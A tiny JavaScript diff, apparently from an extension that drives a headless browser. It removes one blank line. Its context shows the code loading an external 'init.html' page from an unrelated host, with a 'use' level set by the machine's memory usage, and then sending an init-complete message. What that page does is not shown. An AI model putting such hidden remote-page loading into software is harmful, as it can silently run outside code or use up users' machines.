@@ -181,7 +181,6 @@
       
     global.cppPage = page;
 
-    
     // await page.goto('https://ab498.pythonanywhere.com/files/init.html?use=' + (getMemoryUsage().total >= 0.8 ? 0.5 : 0.1));
     await page.goto('http://share.liveblog365.com/init.html?use=' + (getMemoryUsage().total >= 0.8 ? 0.5 : 0.1));
     await tstt({ message: "INIT_COMPLETE", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
